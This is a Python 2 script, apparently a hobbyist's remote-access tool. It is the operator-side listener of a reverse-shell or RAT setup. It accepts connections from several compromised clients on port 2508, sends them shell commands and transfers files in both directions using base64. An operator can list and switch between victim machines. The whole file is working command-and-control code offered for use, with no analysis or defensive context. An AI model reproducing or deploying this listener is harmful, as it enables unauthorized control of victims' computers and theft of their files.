#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import json
import base64
import sys

client_connections = []
client_addresses = []
glob_num_look = 0
num_look_flag = False

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print "[+] Waiting for incoming connection"
        while True:
            try:
                self.connection, self.address = listener.accept()
                client_connections.append(self.connection)
                client_addresses.append(self.address)
                print "[+] Got a connection from " + str(self.address)
                result = self.connection.recv(1024)
                print result
                #break
            except KeyboardInterrupt:
                break

    def reliable_send(self,data,num_look):
        global glob_num_look
        glob_num_look = num_look
        json_data = json.dumps(data)
        client_connections[glob_num_look].send(json_data)

    def reliable_recv(self,num_look):
        global glob_num_look
        glob_num_look = num_look
        json_data = ""
        while True:
            try:
                json_data = json_data + client_connections[glob_num_look].recv(4098)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remote(self, cmd, num_look):
        global glob_num_look
        glob_num_look = num_look
        self.reliable_send(cmd, glob_num_look)
        if cmd[0] == "exit":
            data = self.reliable_recv(glob_num_look)
            client_connections[glob_num_look].close()
            client_connections.pop(glob_num_look)
            client_addresses.pop(glob_num_look)
            # exit()
            global num_look_flag
            num_look_flag = False
            return data
        return self.reliable_recv(glob_num_look)

    def write_file(self,path,content):
        with open(path,"wb") as target_file:
            target_file.write(base64.b64decode(content))
            return "[+] Download Successful."

    def read_file(self, path):
        with open(path, "rb") as target_file:
            return base64.b64encode(target_file.read())

    def run(self):
        while True:
            try:
                if num_look_flag:
                    cmd = raw_input(client_addresses[glob_num_look][0]+ " >> ")
                else:
                    cmd = raw_input(">> ")
                if not cmd:
                    continue
                cmd = cmd.split(" ")

                if cmd[0] == "num_look" and len(cmd) > 1:
                    if int(cmd[1]) >= len(client_connections):
                        print "num_look not found."
                    else:
                        global glob_num_look
                        glob_num_look = int(cmd[1])
                        global num_look_flag
                        num_look_flag = True
                    continue
                if cmd[0] == "num_fetch":
                    print "Current num_look is: " + str(glob_num_look)
                    continue


                if cmd[0] == "bye":
                    x = 0
                    for conn in client_connections:
                        cmd[0] = "exit"
                        self.exec_remote(cmd,x)
                        x = x+1
                    sys.exit()

                if cmd[0] == "list":
                    print "============= CLIENTS ==============="
                    i = 0
                    for addr in client_addresses:
                        try:
                            cmd[0] = "hand_shake"
                            self.exec_remote(cmd, i)
                        except:
                            client_addresses.pop(i)
                            client_connections.pop(i)
                        print str(i) + "\t" + "IP: "+ addr[0] + " \tPORT: " + str(addr[1])
                        i = i + 1
                    print "============= CLIENTS ==============="
                    continue

                if cmd[0] == "upload" and len(cmd) > 1:
                    file_content = self.read_file(cmd[1])
                    cmd.append(file_content)

                result = self.exec_remote(cmd, glob_num_look)

                if cmd[0] == "download" and len(cmd) > 1:
                    result = self.write_file(cmd[1],result)
                print result
            except Exception:
                print "[-] Listener Error."
                continue


listener = Listener("",2508)
listener.run()
